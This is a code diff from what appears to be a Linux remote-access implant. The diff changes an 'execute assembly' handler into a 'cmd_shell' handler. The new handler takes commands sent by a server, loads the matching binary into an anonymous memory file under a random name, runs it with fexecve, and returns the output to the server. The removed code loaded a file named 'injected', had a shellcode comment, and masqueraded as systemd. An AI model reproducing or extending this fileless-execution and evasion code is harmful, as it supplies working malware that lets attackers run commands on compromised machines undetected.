@@ -11,8 +11,9 @@
 #include <liburing.h>
 #include "functions/send/send2serv.h"
 #include "functions/connection/connection.h"
+#include "functions/split/split.h"
 
-void cmd_execute_assembly(struct io_uring *ring, int sockfd, const char *uuid, char *file) {
+void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input) {
 
     srand(time(NULL));
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -24,9 +25,46 @@ void cmd_execute_assembly(struct io_uring *ring, int sockfd, const char *uuid, c
         int name_index = rand() % charset_len;
         name[i] = charset[name_index];
     }
+
+    char **args = split(input, ' ', 150);
+    char *command = args[0];
+
     name[name_len] = '\0';
-    char *const argv[] = {"/usr/lib/systemd/systemd", "--user", NULL};
     char *const envp[] = {NULL};
+
+
+    char full_path[1024];
+    bool found_path = false;
+
+    if (strchr(command, '/') != NULL) {
+        if (access(command, X_OK) == 0) {
+            snprintf(full_path, sizeof(full_path), "%s", command);
+            found_path = true;
+        }
+    } else {
+        char *path = getenv("PATH");
+        if (path) {
+            char *path_copy = strdup(path);
+            char *dir = strtok(path_copy, ":");
+            while (dir != NULL) {
+                snprintf(full_path, sizeof(full_path), "%s/%s", dir, command);
+                if (access(full_path, X_OK) == 0) {
+                    found_path = true;
+                    break;
+                }
+                // Get the next directory in the PATH.
+                dir = strtok(NULL, ":");
+            }
+            free(path_copy);
+        }
+    }
+
+    if (!found_path) {
+        char *message = "ERROR: Command binary not found or error executing command";
+        send2serv(uuid, message, strlen(message));
+        free(args); // Clean up memory from split
+        return;     // Stop execution
+    }
 
     // Create a pipe
     int pipefd[2];
@@ -45,31 +83,32 @@ void cmd_execute_assembly(struct io_uring *ring, int sockfd, const char *uuid, c
         dup2(pipefd[1], STDOUT_FILENO);
         dup2(pipefd[1], STDERR_FILENO);
 
-        int fd = open("/home/azureuser/injected", O_RDONLY); //don't need this
-        if (fd == -1) return;
+        int fd = open(full_path, O_RDONLY);
+        if (fd == -1) exit(1);
         
         struct stat st;
         int rv = fstat(fd, &st);
 
-        if (rv == -1) return;
+        if (rv == -1) exit(1);
 
         void *buffer = malloc(st.st_size); //size of binary
-        if (buffer == NULL) return;
-        //send_get (returns shellcode into buffer variable)
+        if (buffer == NULL) exit(1);
 
         ssize_t bytesRead = read(fd, buffer, st.st_size);
-        if (bytesRead == -1) return;
+        if (bytesRead == -1) exit(1);
 
         close(fd);
         int af = memfd_create(name, MFD_CLOEXEC);
-        if (af == -1) return;
+        if (af == -1) exit(1);
         
         ssize_t bytesWritten = write(af, buffer, st.st_size);
-        if (bytesWritten == -1) return;
+        if (bytesWritten == -1) exit(1);
 
-        fexecve(af, argv, envp);
+        fexecve(af, args, envp);
+        free(args);
 
-        return;
+        exit(1);
+        // return;
     } else {
         close(pipefd[1]);
         
